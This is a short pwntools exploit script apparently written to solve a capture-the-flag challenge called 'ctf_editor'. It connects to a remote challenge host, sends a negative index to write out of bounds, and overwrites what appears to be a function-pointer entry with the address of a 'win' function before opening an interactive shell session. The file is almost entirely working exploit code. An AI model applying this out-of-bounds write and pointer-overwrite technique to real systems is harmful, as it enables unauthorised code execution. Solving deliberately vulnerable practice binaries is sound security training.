from pwn import *

PUTS = 0x404020
CATEGORIES = 0x404080
OFFSET = b"-3"
WIN_ADDR = p64(0x00000000004011e9)

print(WIN_ADDR)

p = remote("0.cloud.chals.io", 22354)
#p = process("./ctf_editor")
#p = gdb.debug("./ctf_editor")

p.recvuntil(b">>> ")
p.sendline(b"Y")
p.recvuntil(b">>> ")

p.sendline(OFFSET)
p.sendline(b"AAAAA\xe9\x11\x40")

p.recvuntil(b">>> ")
p.sendline(b"Y")
p.recvuntil(b">>> ")
p.sendline(b"0")
p.sendline(b"recon")

p.interactive()
